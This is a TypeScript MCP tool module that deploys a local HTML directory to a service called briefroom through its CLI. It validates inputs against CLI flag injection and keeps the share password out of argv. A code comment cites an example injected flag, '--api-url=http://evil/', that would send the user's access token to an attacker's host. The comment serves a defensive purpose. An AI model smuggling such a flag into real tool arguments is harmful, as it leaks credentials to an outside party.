import { z } from 'zod'

import {
  runCliAsToolResult,
  type ToolCliOverrides,
  type ToolTextResult,
} from '../lib/tool-result.js'

export const deployHtmlDescription =
  'Zip a local directory of HTML/CSS/JS and upload it to briefroom, returning a share URL. Supports a share-link expiry (also applied to the existing link on redeploy) and password protection (Pro+ plans). Uses BRIEFROOM_TOKEN (or the briefroom CLI login) for authentication. Non-interactive.'

// Flag injection 防御: `-` 始まりの値は CLI の argv パーサ (citty/mri) に
// フラグとして解釈され、`--api-url=http://evil/` を注入して PAT を攻撃者に
// 送信される脆弱性を塞ぐ。tool 呼び出し経路の入力は agent 生成 (信頼できない)
// なので schema 層で早めに reject する。
//
// 二重防御:
//   1. Positional (path) は zod refine で `-` 始まりを拒否 + argv では `--` 後に置く
//   2. Value flag (room / expires) は `--key=value` inline 形式で組む (citty/mri
//      は最初の `=` 以降を丸ごと値として扱うため、値の中に `--api-url=` が
//      あっても独立フラグにならない)
const PATH_INJECTION_MSG =
  "path must not start with '-'. For a directory literally named '-foo', pass './-foo'."
const ROOM_INJECTION_MSG =
  "room must not start with '-' (would be interpreted as a CLI flag)."

export const deployHtmlInputShape = {
  path: z
    .string()
    .min(1)
    .refine((v) => !v.startsWith('-'), { message: PATH_INJECTION_MSG })
    .describe('Path to the directory containing HTML to deploy (required).'),
  room: z
    .string()
    .min(1)
    .refine((v) => !v.startsWith('-'), { message: ROOM_INJECTION_MSG })
    .optional()
    .describe(
      'Room slug to deploy into. Overrides briefroom.json / directory name.',
    ),
  expires: z
    .enum(['7d', '30d', 'never'])
    .optional()
    .describe(
      'Share link expiry. Defaults to 7d on the server. When set on a redeploy, it also updates the existing link.',
    ),
  new: z
    .boolean()
    .optional()
    .describe(
      'Ignore briefroom.json and create a brand new room with a unique slug.',
    ),
  password: z
    .string()
    .min(6)
    .max(128)
    .optional()
    .describe(
      'Protect the share link with a password (Pro+ plans only). Passed to the CLI via an environment variable, never as an argv flag, so it is not exposed in the process list.',
    ),
  visibility: z
    .enum(['unlisted', 'password_protected'])
    .optional()
    .describe(
      "Share link visibility. 'unlisted' removes an existing password; 'password_protected' requires the password field.",
    ),
}

export type DeployHtmlInput = {
  path: string
  room?: string
  expires?: '7d' | '30d' | 'never'
  new?: boolean
  password?: string
  visibility?: 'unlisted' | 'password_protected'
}

export const DEPLOY_TIMEOUT_MS = 120_000

export async function runDeployHtml(
  input: DeployHtmlInput,
  cliOpts: ToolCliOverrides = {},
): Promise<ToolTextResult> {
  // Fix P2-1 (追加防御): password と visibility='unlisted' の同時指定は矛盾
  // (保護しつつ解除は成立しない)。CLI 側でも弾くが、MCP boundary でも早期 reject して
  // 「password が env で届き visibility=unlisted だけ CLI に渡ってサイレント解除」を防ぐ。
  if (input.password !== undefined && input.visibility === 'unlisted') {
    return {
      content: [
        {
          type: 'text',
          text: "Invalid input: 'password' cannot be combined with visibility 'unlisted'. Omit 'password' (with visibility 'unlisted') to remove protection, or omit 'visibility' to set a password.",
        },
      ],
      isError: true,
    }
  }

  // 全 flag は path より前に置く (`--` 以降は全て positional 扱いになるため)。
  // value flag は `--key=value` inline 形式 (中身に `--` があっても flag 化しない)。
  const args: string[] = ['deploy', '--json', '--no-interactive']
  if (input.room) args.push(`--room=${input.room}`)
  if (input.expires) args.push(`--expires=${input.expires}`)
  if (input.visibility) args.push(`--visibility=${input.visibility}`)
  if (input.new) args.push('--new')
  // `--` セパレータで positional を保護 (以降は flag 解釈されない)。
  args.push('--', input.path)

  // password は argv に載せない (= `ps` で他ユーザーに見えるのを防ぐ)。子プロセスの
  // 環境変数 BRIEFROOM_SHARE_PASSWORD 経由で渡し、CLI 側がそれを読む。
  //
  // Fix P2-2 (hermetic): password の駆動は input.password のみ。親 env に
  // BRIEFROOM_SHARE_PASSWORD が混入していても子へ漏らさないよう、常に子 env を明示構築し、
  // input.password が無いときは明示的に delete する (= 親 env 由来の意図しない再適用 +
  // argon2 再ハッシュ + 閲覧セッション失効を防ぐ)。
  const childEnv: NodeJS.ProcessEnv = { ...(cliOpts.env ?? process.env) }
  if (input.password !== undefined) {
    childEnv.BRIEFROOM_SHARE_PASSWORD = input.password
  } else {
    delete childEnv.BRIEFROOM_SHARE_PASSWORD
  }

  return runCliAsToolResult(
    { timeoutMs: DEPLOY_TIMEOUT_MS, ...cliOpts, args, env: childEnv },
    (stdout) => stdout.trim(),
  )
}
